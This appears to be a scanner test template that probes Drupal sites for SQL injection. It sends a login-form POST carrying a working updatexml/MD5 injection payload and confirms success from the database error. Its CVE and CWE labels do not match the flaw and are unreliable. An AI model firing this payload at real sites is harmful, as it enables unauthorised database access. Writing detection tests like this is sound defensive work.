id: DRUPAL_SQLI
info:
  name: "Drupal SQL Injection"
  description: "Drupal SQL Injection refers to a vulnerability where attackers exploit improper handling of user-supplied inputs in Drupal, a popular content management system (CMS). By injecting malicious SQL queries, attackers can manipulate database operations, potentially accessing, modifying, or deleting sensitive data. This type of vulnerability can lead to severe security risks, making input validation and the use of secure query methods crucial in protecting Drupal-based websites."
  details: "Drupal SQL Injection occurs when the CMS fails to properly sanitize user inputs before incorporating them into SQL queries, allowing attackers to inject malicious SQL code. This vulnerability can be exploited to manipulate the underlying database, potentially bypassing authentication, exfiltrating data, or altering the site's content. Ensuring Drupal modules and core are updated, and following best practices for database interactions, like using prepared statements, can mitigate the risk of such attacks."
  impact: "The impact of a Drupal SQL Injection can be significant, potentially allowing attackers to compromise sensitive data, alter site content, or even take control of the entire website. This could result in unauthorized data access, defacement, or disruption of services. In some cases, the vulnerability may also enable further attacks, such as privilege escalation, leading to broader system compromise."
  category:
    name: INJECT
    shortName: Injection Attacks
    displayName: Injection Attacks (INJECT)
  subCategory: DRUPAL_SQLI
  severity: MEDIUM
  references:
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md"
  cwe:
    - CWE-200
    - CWE-16
  cve:
    - CVE-2020-9402

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST
compliance_standards: compliance/injecton-attacks.conf

api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0

execute:
  type: single
  requests:
    - req:
        - modify_url: "/?q=node&destination=node"
        - modify_method: POST
        - replace_body: 'pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0x23,concat(1,md5(999999999)),1)%23]=bob&name[0]='
validate:
  response_code:
    eq: 500
  response_payload:
    contains_all:
      - "PDOException"
      - 'c8c605999f3d8352d7bb792cf3fdb25b'
    length:
      gt: 0
    not_contains:
      - <html>
      - </html>
strategy:
  run_once: /
